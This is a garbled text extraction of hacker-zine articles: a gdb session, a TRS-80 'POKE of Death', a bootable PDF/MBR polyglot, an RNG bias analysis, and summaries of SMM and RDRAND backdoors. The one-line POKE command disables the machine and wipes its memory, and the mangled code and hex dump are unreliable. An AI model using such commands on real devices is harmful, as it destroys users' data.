/* This can happen in trace mode if an object could not be (gdb)
432
found. */
433
break;
434 memcpy (reloc_addr_arg, (void *) value,
435 MIN (sym->st_size, refsym->st_size));
436 if (__builtin_expect (sym->st_size > refsym->st_size, 0)
437
|| (__builtin_expect (sym->st_size < refsym->st_size, 0)
438 && GLRO(dl_verbose)))
439
{
440
fmt = ‘‘\
441%s: Symbol ‘%s’ has different size in shared object, consider re-linking\n’’;
(gdb)
442
goto print_err;
443
}
444 break;
445# endif
--------------
Breakpoint 6, elf_machine_rela (sym=0x601030, reloc_addr_arg=0x601241, version=<optimized out>,
reloc=0x601318, map=0x555555773228) at ../sysdeps/x86_64/dl-machine.h:434
434 memcpy (reloc_addr_arg, (void *) value,
(gdb) print/x *reloc
$6 = {r_offset = 0x601241, r_info = 0x5, r_addend = 0x0}
(gdb) print refsym->st_size
$7 = 0
(gdb) print sym->st_size
$8 = 0
(gdb)
(gdb) print/x reloc_addr_arg
$9 = 0x601241
(gdb) x/gx reloc_addr_arg
0x601241:0x0000000060103800
(gdb) x/gx value
160x7ffff7ce1184:0x011d8b48f8894153
(gdb) print/x $rsi
$5 = 0x7ffff7ce1184
(gdb) print $rdx
$10 = 0
(after memcpy)
(gdb) x/gx 0x601241
0x601241:0x0000000060103800
(gdb) print/x $rdi
$14 = 0x601241
(gdb) c
Continuing.
Breakpoint 5, elf_machine_rela (sym=0x601030, reloc_addr_arg=0x6012e8, version=<optimized out>,
reloc=0x601330, map=0x555555773228) at ../sysdeps/x86_64/dl-machine.h:448
448 value = ((Elf64_Addr (*) (void)) value) ();
(gdb) print/x $rdi
$15 = 0x601241
(gdb) print/x value
$16 = 0x7ffff7ce1184
(gdb) x/10i value
0x7ffff7ce1184:push
%rbx
0x7ffff7ce1185:mov
%edi,%r8d
0x7ffff7ce1188:mov
0x313c01(%rip),%rbx
# 0x7ffff7ff4d90
0x7ffff7ce118f:mov
(%rbx),%eax
0x7ffff7ce1191:test
$0x80,%ah
0x7ffff7ce1194:jne
0x7ffff7ce11ea
0x7ffff7ce1196:mov
%fs:0x10,%r9
0x7ffff7ce119f:mov
0x88(%rbx),%rdx
0x7ffff7ce11a6:cmp
0x8(%rdx),%r9
0x7ffff7ce11aa:je
0x7ffff7ce11df
(gdb) print/x $rsi
$4 = 0x7ffff7ce1184
17Just as Jonah was told to preach in Nineveh,
Pastor Laphroaig was once called to preach to the harlots and tax collectors at RSA
Asked about the experience, he said that, like Jonah,
he’d rather be thrown overboard than go back
187
POKE of Death for the TRS 80 Model 100
by Dave Weinstein
In his Epistle on the Divinity of Languages, PoCkGTFO 01:07, Pastor Manul Laphroig wrote of the
merits of PEEK and POKE in teaching the youth of a previous generation how to fiddle with hardware
in ways the hardware did not want to be fiddled.
And so I offer to you a short example of the wonders of POKE as applied to interrupt handlers.
In 1983, Radio Shack introduced the Model 100, a copy of the Kyocera Kyotronic 85. With its 40
character wide 8-line screen, built-in 300 baud modem, and up to 32k of RAM, it was a state of the art
laptop, capable of generating endless questions from passengers and crew on any flight.
In high memory, there is a vector at 0xF5FF, which allows a program to hook the keyboard/clock
interrupt. Every 4 ms or so, the timer interrupt fires, and the keyboard is polled. By default, the vector
is a simple RET NOP NOP.
As it happens, the very next vector in high memory is a JMP to handle the low-power situation and
shut the computer down.
0xf5ff
0 xf600
0 xf601
0 xf602
0 xf603
0 xf604
0 xc9
0 x00
0 x00
0 xc3
0 x31
0 x14
(RET)
(NOP)
(NOP)
(JMP 0 x1451 )
The function at 0x1431 will turn the computer off, as the code flows to the actual shutdown sequence
at 0x1451:
0 x1451
0 x1452
0 x1454
0 x1456
0 x1458
di
i n 0 xba
o r i 0 x10
out 0 xba
hlt
Should we replace the RET at 0xF5FF (62975) with a NOP, the Model 100 will power down every time
the timer interrupt fires. The only way to restore functionality is to do a cold restart of the machine,
which, if I recall correctly, in this case requires removing the batteries, unplugging the machine, and
disabling the internal NiCad battery. All of the contents would be lost. For those who do not know what
has been done, the computer shows every sign of having simply died.
POKE 62975, 0
The only way to prevent it is to prevent access to the BASIC interpreter. Which is possible, but is a
discussion for another time.
Figure 3: POKE 62975, 0
19Pastor Laphroaig tells us that the news is stranger than fiction,
because unlike the news, fiction requires an element of truth.
208
This OS is also a PDF
by Ange Albertini
A careful reader may have noticed that a bootable OS image was hidden in the last issue of PoC k GTFO,
as one of the files in its dual PDF/ZIP structure (if you haven’t, download and extract it now!). This
time, though, let’s hide it in plain sight. You will find by running ‘qemu-system-i386 -fda pocorgtfo02.pdf’
that the PDF file you are reading is also a bootable disk image.
8.1
Requirements
To combine two file types, we first need to list the requirements of each format and then produce a single
file that meets both sets of requirements with no conflicts.
What makes a bootable disk image? An X86 machine begins booting by copying the first 512 byte
sector, the Master Boot Record, into RAM and executing it. The requirements for a functional MBR
are simple:
• 16 bit x86 code starts at offset 00.
• It will be executing at the 0000:7c00 address in RAM.
• It must be 512 bytes long, ending with the signature 55, AA
• Labels and primary partition tables are optional, but can go within this sector.
• It must contain code that finds and loads into RAM the code for the next boot stage (such as an
OS loader).
PDF files are a mixture of text and binary fragments, which are parsed from the start of the file and
delimited by words and newlines. The requirements for a valid PDF are also simple and surprisingly
flexible:
• It is initially parsed as text.
• The signature “%%PDF-” must be present within the first 1024 bytes. It can be present there twice
or more.
• Comment lines begin with ‘%’, which is 25 in hex.
• Binary characters other than CRLF are acceptable in a comment.
• “Multi-line” binary objects or simply larger objects can also be stored in object streams, which are
declared like this:
<o b j number> <r e v i s i o n > o b j
<<>>
stream
<stream c o n t e n t >
endstream
endobj
8.2
Strategy
In most cases, we can freely prepend anything at the start of the file as long as the above requirements
are fulfilled. Luckily, the % comment character is 0x25, which encodes nicely as an x86 and instruction.
Thus, the head of the file can be 25FFFF: and ax, 0xffff, which also starts a PDF comment. We can
then add a jump into the next part of the code, which will be stored in a dummy object stream below,
and then finish our first line. Adding a PDF signature will prevent any potential problem in case the
stream object is too long: it can then contain anything, of any length, as long as it doesn’t contain the
‘endstream’ keyword.
21; t h i s w i l l encode a s ‘%\ x f f \ x f f \ xeb \ x21 ’ , a comment l i n e
and ax , −1
jmp s t a r t
%PDF−1.5
999 0 o b j
<<>>
stream
code :
...
; put t h e 55AA s i g n a t u r e a t t h e end o f t h e 512 b l o c k
t i m e s 200h − 2 − ( $ − $$ ) db 0 cch
db 55h , 0 aah
endstream
endobj
8.3
An Unexpected Challenge
This was almost too easy, but there is a caveat to keep in mind. I’ll mention it here to save you the
headache when reproducing these results.
This new challenge emerged as I was testing the bootable PDF files with different PDF readers.
Since we pre-pend our MBR without altering the contents of the original document, the original’s cross-
reference table XREF is no longer in sync with the actual file offsets. Technically, this makes the XREF
tables corrupted.
Corrupted XREFs are so common that they are usually transparently recovered by all PDF readers,
even picky ones such as PDF.JS. However, your pdflatex may generate a document based on the opti-
mized PDF 1.5 specification, where the XREF is stored not in cleartext as in PDF 1.4, but rather as a
separate, compressed object. This configuration choice is made for the user by the TeX distribution, so
even a freshly updated pdflatex install may generate PDF 1.4 documents.
Even when compressed, corrupted XREFs are recovered by some readers, such as GS and Sumatra.
Unfortunately, Foxit, Adobe, Firefox, Chrome, and Poppler-based readers—such as Evince and Okular—
would reject such a document. Although rejecting corrupted documents out of hand is the best strategy,
even Pastor Laphroaig would be pretty pissed if folks couldn’t read his epistles because of this.
A simple and elegant workaround that achieves 100% reader compatibility with our MBR PDF is to
make sure that, even if your pdflatex distribution generates a 1.5 format document, it doesn’t compress
the XREF. This is easily done by adding the following command to your L A TEX source.
\ p d f o b j c o m p r e s s l e v e l =0
This command will cause pdflatex to store non-objects uncompressed while still taking advantage of
other 1.5 features such as reducing document bloat. I should add that, although the fix looks trivial,
finding the real cause and the most elegant solution was a challenge.
————
Enjoy booting this PDF, and be sure to share copies—both electronic and paper—so that your
neighbors can enjoy it as well!
2200000000
00000010
00000020
00000030
00000040
00000050
00000060
00000070
00000080
00000090
000000a0
000000b0
000000c0
000000d0
000000e0
000000f0
00000100
00000110
00000120
00000130
00000140
00000150
00000160
00000170
00000180
00000190
000001a0
000001b0
000001c0
000001d0
000001e0
000001f0
25
39
73
54
62
6f
69
0d
65
20
69
69
74
65
6f
65
0d
0f
db
b8
00
f5
31
31
75
44
cd
ff
cc
cc
cc
cc
ff
39
74
46
79
72
67
00
61
20
73
33
66
61
6d
63
00
82
b8
00
e0
c3
00
c9
f0
45
10
eb
cc
cc
cc
cc
ff
39
72
4f
20
20
20
59
74
53
3a
38
6f
64
20
75
be
97
10
7e
07
89
89
ad
c3
46
5e
fe
cc
cc
cc
cc
e9
39
65
20
52
4d
61
6f
65
6f
20
36
30
69
64
74
27
00
02
89
e8
c3
d8
e8
30
50
58
ea
cc
cc
cc
cc
fc
20
61
49
74
61
6e
75
6e
72
71
20
32
6e
69
69
7c
be
b5
c6
65
c1
c1
dc
31
56
c3
00
cc
cc
cc
cc
00
30
6d
73
2e
6e
64
20
20
72
65
2d
2e
67
73
6e
e8
cc
00
e8
00
e8
e8
ff
32
83
b8
00
cc
cc
cc
cc
0a
20
0a
73
20
75
20
68
62
79
6d
66
70
20
6b
67
3e
7c
b1
38
ac
0c
04
e8
33
e0
20
ff
cc
cc
cc
cc
25
6f
0a
75
52
6c
46
61
79
2e
75
64
64
6b
2e
20
00
e8
02
00
3c
e8
e8
2c
34
0f
0e
ff
cc
cc
cc
cc
50
62
50
65
76
20
72
76
20
0a
2d
61
66
65
0a
6b
31
2c
b6
be
00
39
29
00
35
05
cd
cc
cc
cc
cc
cc
44
6a
6f
20
64
4c
69
65
61
0d
73
20
0a
72
0d
65
c0
00
00
eb
74
00
00
83
36
83
10
cc
cc
cc
cc
cc
46
0a
43
30
2e
61
65
20
20
54
79
70
0d
6e
00
72
8e
b8
b2
7c
06
89
89
c1
37
7d
c3
cc
cc
cc
cc
cc
2d
3c
20
78
20
70
6e
62
67
72
73
6f
00
65
32
6e
d8
e0
00
e8
b4
d8
d8
02
38
89
be
cc
cc
cc
cc
cc
31
3c
6f
30
50
68
64
65
72
79
74
63
31
6c
29
65
30
07
cd
08
0e
c1
e8
81
39
c6
72
cc
cc
cc
cc
cc
2e
3e
72
32
61
72
73
65
75
20
65
6f
29
20
20
6c
d2
8e
13
00
cd
e8
24
f9
41
ac
7c
cc
cc
cc
cc
cc
35
3e
20
0a
73
6f
0a
6e
65
74
6d
72
20
66
45
2e
cd
c0
72
ea
10
08
00
00
42
b4
e8
cc
cc
cc
cc
55
0a
0a
47
0d
74
61
0a
20
2e
68
2d
67
52
72
78
0a
13
31
7b
00
eb
e8
c3
02
43
0e
95
cc
cc
cc
cc
aa
|%......%PDF-1.5.|
|9999 0 obj.<<>>.|
|stream..PoC or G|
|TFO Issue 0x02..|
|by Rt. Rvd. Past|
|or Manul Laphroa|
|ig and Friends..|
|..You have been |
|eaten by a grue.|
| Sorry...Try th|
|is: qemu-system-|
|i386 -fda pocorg|
|tfo02.pdf...1) R|
|eading kernel fr|
|om disk....2) Ex|
|ecuting kernel..|
|...’|.>.1...0...|
|......|.,......1|
|..............r{|
|..~...8...|.....|
|....e..<.t......|
|........9.......|
|1.......)....$..|
|1......,........|
|u..0123456789ABC|
|DEFPV.....}.....|
|..^X.. .....r|..|
|................|
|................|
|................|
|................|
|..............U.|
Hey kids! Can you color the bytes of this MBR to indicate what’s going on?
23CALC.EXEkGTFO
249
A Vulnerability in Reduced Dakarand from PoCkGTFO 01:02
by joernchen of Phenoelit
I’m not a math guy, so this is a poor man’s RNG analysis. Try it yourself at home!
9.1
Introduction
In PoCkGTFO 01:02, Dan Kaminsky proposed the following code for use as a Random Number Gen-
erator, arguing that the phase difference between a fast clock and a slow clock is sufficient to produce
random bits in a high level language. This is a reduced version of his Dakarand program, with the intent
of the reduction being that if there is any vulnerability within the code, that vuln ought to be exploitable.
// These f u n c t i o n s form an RNG.
function m i l l i s ()
{ return Date . now ( ) ; }
function flip_coin ()
{n=0; then = m i l l i s ( ) + 1 ; while ( m i l l i s ()<= then ) {n=!n ; } return n ; }
function get_fair_bit ()
{ while ( 1 ) { a=f l i p _ c o i n ( ) ; i f ( a != f l i p _ c o i n ( ) ) { return ( a ) ; } } }
f u n c t i o n get_random_byte ( )
{n=0; b i t s =8; while ( b i t s −−){n<<=1; n|= g e t _ f a i r _ b i t ( ) ; } return n ; }
// Use i t l i k e t h i s .
r e p o r t _ c o n s o l e = f u n c t i o n ( ) { while ( 1 ) { c o n s o l e . l o g ( get_random_byte ( ) ) ; } }
report_console ( ) ;
Actually the above code boils down to the function flip_coin, which takes a boolean value n=0 and
continuously flips it until the next millisecond. The outcome of this repeated flipping shall be a random
bit. We neglect the get_fair_bit function mostly in this analysis, as it just slows down the process and
adds almost no additional entropy. For gathering random bits we are just left with the clock ticking for
us.
9.2
A Naive Analysis
In order to analyze the output of the RNG we need some of its output,
so I simply put up a small HTML piece which would pull out 100.000
random bytes out of the above RNG and log it to the HTML document.
Then a severe 90-minute DoS on my Firefox 24 happened, after which I
managed to copy and paste one hundred thousand uint8_t results into
a text file.
After messing with several tools like ministat, sort and uniq I could
show with the following ruby script that this RNG (on my machine)
has a strong bias towards bytes with low hamming weights:
#! / u s r / b i n / env r u b y
f=F i l e . open (ARGV[ 0 ] )
h = Hash . new
f . e a c h _ l i n e do |m|
n = m. to_i
i f h [ n ] . nil ?
h [ n]=1
else
h [ n ] = h [ n]+1
end
end
t = h . sort_by do | k , v | v end
25t . each do | a |
p u t s "Num: \ t#{a [ 0 ] } "+
" \ tCount : \ t#{a [ 1 ] } "+
" \ tWeight : \ t#{a [ 0 ] . to_s ( 2 ) . s p l i t ( " " ) . r e j e c t { | j | j==" 0 " } . count } "
end
The shortened output of this script on the 100k 8bit numbers is as follows. Note that the heavy
hamming weights, like 11111111 are least common and the light hamming weights, like 00000000 are
most common.
Value Count Weight
255
22
8
254
23
7
251
28
7
253
29
7
127
32
7
239
34
7
191
34
7
223
36
7
247
37
7
...
...
...
132
1173
2
64
1821
1
32
1881
1
16
1922
1
1
1934
1
8
2000
1
4
2042
1
2
2133
1
128
2145
1
0
3918
0
The table lists the Number which is the output of the RNG along with this number’s hamming weight
as well as the count of this number in total within the 100.000 random bytes. For a random distribution
of all possible bytes we could expect roughly a count of 390 for each byte. But as we see, the number 0
with the hamming weight 0 peaks out with a count of 3918, whereas 255 with the hamming weight of 8
is generated 22 times by the RNG. That’s not fair!
9.3
My fair bit is not fair!
Real statistical analysis of an RNG is hard, and I will not attempt it here.
Still, looking at a few simple distributions might give us a hint (alas, only a
hint) of what might behind the unfairness.
First, a short recap on how this RNG works:
We’ve got a 1 millisecond timeslot from t0 to t1, where at t1 the flip_coin
method will stop. The first call to get_random_byte can happen anywhere
between t0 and t1:
Let’s say it is here:
Now the algorithm happily flips the bit until t1 and hands over the result
of this flipping as a random bit (note that we’re omitting get_fair_bit here).
26Although we cannot predict the output of a single run of flip_coin, things get a bit more predictable
when we make a lot of consecutive calls to flip_coin. Let’s say we need the time d to process and store
the result of flip_coin. So the next time we flip_coin we are at t1 + d1:
Now the RNG flips the coin until t2 in order to give us a random bit. As we are calling the RNG
more than twice in a row, the next flip_coin is at t2+d2, and so on.
The randomness and fairness of the RNG’s random bit depends on how fairly and randomly we get
odd and even values of d, since that the same amount of flips yields the same bit as we have a static start
value of 0/false. 11 So it makes sense to look at the distribution of d. To visualize this and to compare
it with another browser I came up with this slight modification of the RNG that counts the flips and
records them right inside the HTML page:
function flip_coin ()
{ i =0;n=0; then=m i l l i s ( ) + 1 ; while ( m i l l i s ()<= then ) {n=!n ; i++} return [ n , i ] ; }
function get_fair_bit ()
{ while ( 1 ) { a=f l i p _ c o i n ( ) ; i f ( a [ 0 ] ! = f l i p _ c o i n ( ) [ 0 ] ) { return ( a ) ; } } }
function doit (){
var i = 1 0 0 0 0 ;
while ( i −−){
var d = document . getElementById ( ‘ ‘ t a r g e t ’ ’ ) ;
var c o n t e n t = document . createTextNode ( g e t _ f a i r _ b i t ( ) . t o S t r i n g ( ) + ‘ ‘ \ n ’ ’ ) ;
d . appendChild ( c o n t e n t ) ;
}
}
Loading the page in Chromium and Firefox and throwing them into gnuplot, we get:
Chromium
20
400 18
350 16
14
300
Firefox
450
250
200
150
10
8
6
100
4
50
0
10000
12
2
20000
30000
40000
50000
60000
70000
Cycle Count
0
5000
10000
15000
20000
25000
30000
35000
40000
45000
50000
Cycle Count
We can see that the graph for Chromium has a lot more variance in the number of coin flip within
a millisecond than that for Firefox. Although, strictly speaking, it might still be possible to get good
randomness with poor variance if the few frequent values were to alternate just so due to some underlying
scheduling magic, it seems reasonable to expect that the same magic would also increase the variance in
the flip numbers.
We can also see, with the help of simple UNIX tools, that Chromium counts do not peak out to a
certain value, unlike those of Firefox:
11 The second coin flip in get_fair_bit complicates it a bit, but it cannot substantially improve the RNG’s entropy if it
lacks in the first place.
27$ s o r t i t e r _ F i r e f o x | uniq −c | s o r t −n
...
176 64683
181 64671
195 64673
195 64684
207 64717
217 64672
286 64718
318 64721
393 64719
405 64720
9.4
vs.
$ s o r t iter_Chromium | uniq −c | s o r t −n
...
15 45147
15 45282
16 44947
16 45004
16 45010
16 45076
16 45086
17 45059
17 45107
19 45092
Closing words
In conclusion we see that in Firefox under stress Dan’s RNG appears to fail at exactly the point he wanted
to use as the main source of randomness. The tiny clock differentials used to gather the entropy are
not given often enough in Firefox. There is still much room to stress this RNG implementation. Bonus
rounds would include figuring exactly what the significant difference between the Firefox and Chromium
JavaScript runtime is that causes this malfunction on Firefox. Also attacks on other JavaScript runtimes
would be interesting to see. It might even be the case that this implementation has different results
under different conditions with respect to CPU load.
A broader question occurs: The Dakarand RNG relies on what could be called a “code clock.” It may be
that in many kinds of environments stressed code clocks tend to go into phase with one another. Driven
by stress to seek comfort in each other’s rhythms, their chance encounters may grow into something more
close and intimate, grinding into periodic patterns. Which, of course, is bad for randomness. Can we
learn to tell such environments from others, where periodization with stress doesn’t happen? –PML
28This page intentionally left blank.
Draw your own damned picture.
2910
Juggernauty
by Ben Nagy
‘Twas UMBRA, and the STUNT WORMS
Did ZARF and CIMBRI in the SUEDE:
All GUPY were the PUZZLECUBES,
And the DIRESCALLOP AQUACADE.
“Beware the JUGGERNAUT, my son!
The RONIN bytes, the IMSI catch!
Beware the TUSKATTIRE, and shun
EGOTISTICAL GIRAFFE!”
He brought his FERRET CANNON forth:
yet SKOPE he not the RUTLEY spoor —
So browsed he to an onion,
And surfed awhile in Tor.
And, as in BOOTY Tor he surfed,
The JUGGERNAUT, with eyes of FLAME,
Leapt from the EVOLVED MUTANT BROTH,
with DISHFIRE as it came!
One, two! One, two! And through and through
The FERRET CANNON’s furred attack!
He left it dead, and with its LED
He rode his QUICK ANT back.
“And, has thou slain the JUGGERNAUT?
Come to my arms, my DANGERMOUSE!
OLYMPIC day! MESSIAH! MORAY!”
He TALKQUICK in his joy.
‘Twas UMBRA, and the STUNT WORMS
Did ZARF and CIMBRI in the SUEDE;
All GUPY were the PUZZLECUBES,
And the DIRESCALLOP AQUACADE.
30“He that is without sin among you,
let him first cast a stone at her.”
3111
A Call for PoC
by Rt. Revd. Pastor Manul Laphroaig
We stand, sit, or simply relax and chill on the shoulders of the giants, Phrack and Uninformed. They
pushed the state-of-the-art forward mightily with awesome, deep papers and at times even with poetry
to match. And when a single step carries you forward by a measure of academic years, it’s OK to move
slowly.
But for the rest of us dwarves, running around or lounging on those broad shoulders can be so much
fun! A hot PoC is fun to toss to a neighbor, and who knows what some neighbor will cook up with it
for the shared roast of the vuln-beast? A neighbor might think, “my PoC is unexploitable” or “it is too
simple,” but verily I tell you, one neighbor’s PoC is the missing cog for another neighbor’s 0day. How
much PoC is hoarded and lies idle while its matching piece of PoC wastes away in another hoard? Let’s
find out!
11.1
Author guidelines
Do this: Write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research.
Like an email, keep it short. Like an email, you should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do. Don’t try to make it thorough or broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to implement
Dakarand in a 512-byte boot sector; teach me how to compose shellcode in Korean characters; or, teach
me how to patch Natalie’s Tamagotchi shellcode with nothing but MSPAINT.EXE. Don’t tell me that it’s
possible; rather, teach me how to do it myself with the absolute minimum of formality and bullshit.
Like an email, I expect informal (or faux-biblical) language and hand-sketched diagrams. Write it
in a single sitting, and leave any editing for our poor bastard of an editor to apply to later drafts.
Send this to pastor@phrack.org and hope that the neighborly Phrack folks—praise be to them!—aren’t
man-in-the-middling our submission process.
11.2
Other Departments
Editor at Large
Dept. of Bringing APT Home
Dept. of Funky File Formats
Dept. of Fail
Ethics Board
Dept. of Busting BS
Poet Laureate
Dept. of Drama
Dept. of PHY
Rt. Revd. Pastor M.L.
Cultural attaché of the 41st Directorate
Ange Albertini
FX of Phenoelit
The Grugq
pipacs
Ben Nagy
Xbf
Michael Ossmann
32AN ADDRESS
to the
SECRET SOCIETY
of
POC k GTFO
concerning
THE GOSPEL OF THE WEIRD MACHINES
and also
THE SMASHING OF IDOLS TO BITS AND BYTES
by the Rt. Revd. Dr.
PASTOR MANUL LAPHROAIG
pastor@phrack org
March 2, 2014
PHILADELPHIA:
Published by the Tract Association of POCkGTFO and Friends,
And to be Had from Their Street Prophet,
Omar, at the Corner of 45th and Locust,
Or on the Intertubes as pocorgtfo03.pdf,
Which Could Just as Well Be
pocorgtfo03.jpg, pocorgtfo03.raw, pocorgtfo03.zip,
or pocorgtfo03.png.enc.
No 0x03 Самиздат
1Legal Note: Permission to use all or part of this work for personal, classroom or any other use is NOT granted
unless you make a copy and pass it to a neighbor without fee. If burning a book is a sin, then copying books is as
much your sacred duty. Saint Leibowitz of Utah was once himself a humble booklegger; there ain’t no shame in it.
Reprints: This issue is published through samizdat as pocorgtfo03.pdf. While we recognize that it is clearly ille-
gal under the CFAA to enumerate integers in a URL, you might want to risk counting upward from pocorgtfo00.pdf
to get our other issues. Though we promise to try to talk some sanity into the prosecutor, we cannot promise that
he will listen to reason. In the event that you are convicted for counting, please give our kindest regards to Weev.
Technical Note: This file, pocorgtfo03.pdf, complies with the PDF, JPEG, and ZIP file formats. When en-
crypted with AES in CBC mode with an IV of 5B F0 15 E2 04 8C E3 D3 8C 3A 97 E7 8B 79 5B C1 and a key of
“Manul Laphroaig!”, it becomes a valid PNG file. Treated as single-channel raw audio, 16-bit signed little-endian
integer, at a sample rate of 22,050 Hz, it contains a 2400 baud AFSK transmission.
21
Call to Worship
Neighbors, please join me in reading this fourth issue of the International Journal of Proof of Concept or Get
the Fuck Out, a friendly little collection of articles for ladies and gentlemen of distinguished ability and taste
in the field of software exploitation and the worship of weird machines. If you are missing the first three
issues, we the editors suggest pirating them from the usual locations, or on paper from a neighbor who picked
up a copy of the first in Vegas, the second in São Paulo, or the third in Hamburg. This fourth issue is an
epistle to the good neighbors at the Troopers Conference in Heidelberg and the neighboring RaumZeitLabor
hackerspace in Mannheim.
We begin with Section 2, in which our own Rt. Revd. Dr. Pastor Manul Laphroaig condemns the New
Math and its modern equivalents. The only way one can truly learn how a computer works is by smashing
these idols down to bits and bytes.
Like our last two issues, this one is a polyglot. It can be interpreted as a PDF, a ZIP, or a JPEG. In
Section 3, Ange Albertini demonstrates how the PDF and JPEG portions work. Readers will be pleased to
discover that renaming pocorgtfo03.pdf to pocorgtfo03.jpg is all that is required to turn the entire issue
into one big cat picture!
Joshua Wise and Jacob Potter share their own System Management Mode backdoor in Section 4. As this
is a journal that focuses on nifty tricks rather than full implementation, these neighbors share their tricks
for using SMM to hide PCI devices from the operating system and to build a GDB stub that runs within
SMM despite certain limitations of the IA32 architecture.
In Section 5, Travis Goodspeed shares with us three mitigation bypasses for a PIP defense that was
published at Wireless Days. The first two aren’t terribly clever, but the third is a whopper. The attacker
can bypass the defense’s filter by sending symbols that become the intended message when left-shifted by
one eighth of a nybble. What the hell is an eighth of a nybble, you ask? RTFP to find out.
Conventional wisdom says that by XORing a bad RNG with a good one, the worst-case result will be as
good as the better source of entropy. In Section 6, Taylor Hornby presents a nifty little PoC for Bochs that
hooks the RDRAND instruction in order to backdoor /dev/urandom on Linux 3.12.8. It works by observing
the stack in order to cancel out the other sources of entropy.
We all know that the Internet was invented for porn, but Assaf Nativ shows us in Section 7 how to
patch a feature phone in order to create a Kosher Phone that can’t be used to access porn. Along the way,
he’ll teach you a thing or two about how to bypass the minimal protections of Nokia 1208 feature phone’s
firmware.
In the last issue’s CFP, we suggested that someone might like to make Dakarand as a 512-byte X86 boot
sector. Juhani Haverinen, Owen Shepherd, and Shikhin Sethi from FreeNode’s #osdev-offtopic channel did
this, but they had too much room left over, so they added a complete implementation of Tetris. In Section 8
you can learn how they did it, but patching that boot sector to double as a PDF header is left as an exercise
for the loyal reader.
Section 9 presents some nifty research by Josh Thomas and Nathan Keltner into Qualcomm SoC security.
Specifically, they’ve figured out how to explore undocumented eFuse settings, which can serve as a basis for
further understanding of Secure Boot 3.0 and other pieces of the secure boot sequence.
In Section 10, Frederik Braun presents a nifty obfuscation trick for Python. It seems that Rot-13 is a
valid character encoding! Stranger encodings, such as compressed ones, might also be possible.
Neighbor Albertini wasn’t content to merely do one crazy concoction for this file. If you unzip the PDF,
you will find a Python script that encrypts the entire file with AES to produce a PNG file! For the full story,
see the article he wrote with Jean-Philippe Aumasson in Section 11.
Finally, in Section 12, we do what churches do best and pass around the donation plate. Please contribute
any nifty proofs of concept so that the rest of us can be enlightened!
342
Greybeard’s Luck
a sermon by the Rt. Revd. Dr. Pastor Manul Laphroaig
My first computer was not a computer; rather, it was a “programmable micro-
calculator.” By the look of it, it was macro rather than micro, and could double as
a half-brick in times of need. It had to be plugged in pretty much most of the time
(these days, I have a phone like that), and any and all programs had to be punched
in every time it lost power for some reason. It sure sounds like five miles uphill in
the snow, both ways, but in fact it was the most wondrous thing ever.
The programmable part was a stack machine with a few additional named mem-
ory registers. Instructions were punched on the keyboard; besides the stack reverse
Polish arithmetic, branches, and a couple of conditionals, there was a command for
pushing a keyed-in number on top of the stack. That was my first read-eval-print
loop, and it was amazing. Days were spent entering some numbers, hitting go, ob-
serving the output, and repeating over and over. (A trip from the Moon base back to
Earth took almost a year, piece by piece. A sci-fi monthly published a program for
each trajectory, from lift-off to refueling at a Lagrange point, and finally atmospheric
braking and the perilous final landing on good old Earth.)
You see, I understood everything about that calculator: the stack, the stop-and-
wait for the input, reading and writing registers (that is, pushing the numbers in
them on top of the stack or copying the top of the stack into them), the branches and
the loops. There was never a question how any operation worked: I always knew what
registers were involved, and had to know this in order to program anything at all.
No detail of the programming model could be left as “magic” to “understand later”;
no vaguely understood part could be left glossed over to “do real work now.” There
were no magical incantations to cut-and-paste to make something work without
understanding it.
I did not recognize how lucky I had been until, many years later, I decided to take up “real” industrial
programming, which back then meant C++. Suddenly my head was full of Inheritance, Overloading, En-
capsulation, Polymorphism, and suchlike things, all with capital letters. I learned their definitions, pasted
large blocks of code, and enthusiastically puzzled over tricky questions from these Grand Principles of Object
Oriented Programming such as, “if a virtual function is also overloaded, which version will be called?” In
retrospect, my time would have been better spent researching whether Superman would win over Batman.
At about the same time I learned about New Math. It was born of the original Sputnik Moment and
was the grand idea to reform the teaching of mathematics to school children so that they would make better
Sputniks, and faster. The earth-bound kind of arithmetic that was useful in a shop class would be replaced
by the deeper, space-age kind.
That Sputnik must have carried a psychotronic weapon. There is no other sane explanation for why
the schooling of American engineers—those who launched the same kind of satellite just four months later—
suddenly wasn’t deemed good enough. A whole industry arose to print new, more expensive textbooks, with
Ph.D.s in space-age math education to match; teachers were told to abandon the old ways and teach to the
new standards. Perfectly numerate parents could no longer comprehend the point of grade school arithmetic
homework.
Suddenly, adding numbers mattered less than knowing that Addition was Commutative; as a result,
school children learned about Commutativity but could no longer actually add numbers. They couldn’t
add numbers in their heads or on paper, let alone multiply them. Shop class became the only place in
school where one could actually learn about fractions—not that they were Rational Numbers, but how to
actually measure things with them, and why. College students thought an algebraic equation was harder if
it contained fractions.
Knowledge of math was measured by remembering special words, rather than a show of skill. You see, a
skill always involves a lot of tricks; they may be nifty, but they are also too technical and who has time for
5that in this space age? Important Concepts, on the other hand, are nicely general, and you can have middle
schoolers saying things straight out of the graduate program within a few weeks! Is that not Progress?
Indeed, only one other Wonder of Progress can stand close to New Math: the way that children are locked in
a room with a literate adult for most of the day, for years, and still emerge unable to read. People couldn’t
pull that off in the Dark Ages; this takes Science to organize.
What came after New Math was even worse. Some of the school children who could barely count but
knew the Important Concepts became teachers and teachers of teachers. Others realized that despite all the
Big Ideas the skill of math was vanishing. They saw the fruits of Big Idea pushers dismissing drill; they
concluded that drill was the key to the skill. So subsequent reforms barreled between repetitive, senseless rote
and more Capital Letter Words. These days it seems that Discovery, Higher Order, Critical Thinking are in
fashion, which means children must waste days of school time “discovering” Pi and suchlike, working through
countless vaguely defined steps, only to memorize whatever the teacher would tell them these activities meant
in the end. Now we have the worst of all: wasted time and boredom without any productive skill actually
learned. The only thing than can be learned in such a class is helplessness and putting up with pretentious
waste of time, or worse!, mistaking this for actual math.
I was beginning to feel pretty helpless in the world of C++ Important Concepts of Object Oriented
Programming. I was yearning for my old calculator, where I did not have to learn a magical order of mystery
buttons to press in order to get the simplest program to work. Having had a book fetish since childhood, I
hoped for a while that I just hadn’t found the right one to Unleash or Dummify myself in 21 Days. I was
like a school child who could hardly suspect that the latest textbook with brightly colored pictures is full of
vague unmathematical crap that would horrify actual mathematicians. (More likely, such mathematicians
of ages past would run the textbook authors through in a proper duel.)
Then one day that world was blown to bits. Polymorphism and Inheritance blew up when I saw a vtable.
After that, function name mangling was a brief mop-up operation that took care of Overloading. Suddenly,
the Superman-vs-Batman contests and other C++ language-lawyer interview fare became trivial. It was
